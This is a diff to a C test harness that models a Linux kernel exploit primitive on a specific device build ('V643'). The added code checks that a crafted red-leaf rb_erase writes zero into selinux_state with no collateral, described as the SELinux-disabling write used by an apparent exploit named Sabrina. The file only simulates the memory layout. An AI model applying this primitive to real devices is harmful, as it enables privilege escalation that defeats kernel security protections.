@@ -68,6 +68,27 @@ int main(void) {
       TCL_V643_SYSCTL_BOOTID_OFF != 0x0295bce1ULL)
     return fail("V643 boot_id anchors changed");
 
+  /* Exact V643 rb_erase no-left-child branch at +0x4c.  With both children
+   * NULL and a RED victim (pc bit 0 clear), it stores rb_right == NULL into
+   * the selected parent slot and returns without a child update or color
+   * rebalance.  For pc=(target-8), the ordinary parent-slot selection is
+   * exactly target.  This is the clean SELinux zero-write used by Sabrina. */
+  uint64_t selinux_state_qword = UINT64_C(0xffffffffffffffff);
+  uint64_t selinux_adjacent_qword = UINT64_C(0x8877665544332211);
+  const uint64_t selinux_target = TCL_V643_KIMAGE_TEXT_BASE +
+                                  TCL_V643_SELINUX_STATE_OFF;
+  const uint64_t red_parent_color = selinux_target - 8;
+  const uint64_t null_right_child = 0;
+  const uint64_t null_left_child = 0;
+  if ((red_parent_color & 1) != 0 || null_left_child != 0 ||
+      null_right_child != 0)
+    return fail("SELinux zero-write shape is not a red leaf");
+  selinux_state_qword = null_right_child;
+  if (selinux_state_qword != 0)
+    return fail("red-leaf rb_erase did not zero selinux_state");
+  if (selinux_adjacent_qword != UINT64_C(0x8877665544332211))
+    return fail("red-leaf zero-write unexpectedly has collateral");
+
   /* A parent_color of zero is a useful repair primitive: rb_erase writes
    * zero to the chosen target, skips the parent dereference and puts target
    * only in the current scratch lock's rb_root.  Exact V643 init_cred bytes
@@ -108,7 +129,9 @@ int main(void) {
   printf("SELinux candidate: parent=+%#llx collateral stays in "
          "non_irq_wake_reason\n",
          (unsigned long long)TCL_V643_SELINUX_STAMP_PARENT_OFF);
+  printf("SELinux red-leaf zero: target=+%#llx, no child/collateral store\n",
+         (unsigned long long)TCL_V643_SELINUX_STATE_OFF);
   puts("PASS: exact V643 direct rb_erase/readback geometry is modeled");
-  puts("CAUTION: every modeled read/write also clobbers parent_color+8");
+  puts("CAUTION: arbitrary non-zero writes still have collateral; the red-leaf zero does not");
   return 0;
 }
